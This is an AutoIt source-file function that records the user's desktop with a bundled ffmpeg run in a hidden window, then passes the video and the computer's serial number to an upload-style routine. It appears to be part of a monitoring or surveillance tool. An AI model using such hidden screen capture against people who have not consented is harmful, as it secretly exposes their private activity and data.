Func screenRecording()
	
	Local $epoch=generateDateTime()
	
	Local $durration=generateDurrationFromSeconds($screenRecordingDurration)
	
	$filename=generateNameFromDateTime()&".mp4"
	
	$filePath=@WorkingDir & "\files\screenRecordings\"&$filename
	
	if Not FileExists(@WorkingDir & "\files\screenRecordings\") Then
		
		DirCreate(@WorkingDir & "\files\screenRecordings\")
		
	EndIf
	
	Local $pid = Run(@WorkingDir&"\lib\bin\ffmpeg.exe  -t "&$durration&" -f gdigrab -framerate 50 -i desktop "&$filePath, "", @SW_HIDE)
	
	#comments-start
	 you see durring testing the ffmpeg.exe is not predictable we dont want wait for it incase it failse to close
	 so what we do we run it and keep its pid and sleep for five seconds more than the milli seconds we gave it to record
	 thus incase we wake up and find it still running we kill it
	#comments-end
	
	sleep(($screenRecordingDurration*1000)+5000)
	
	if ProcessExists($pid) Then
		
		ProcessClose($pid)
		
	EndIf
	
	
	if  FileExists($filePath) Then
		
		putScreenRecording($computer_serial,$epoch,$filename,$filePath)
		
		
	Else
		handleErrors("screenRecording", "ffmpeg error")
	
	EndIf

	if @error then 
		
		handleErrors("screenRecording", @error)
		
	EndIf
	
EndFunc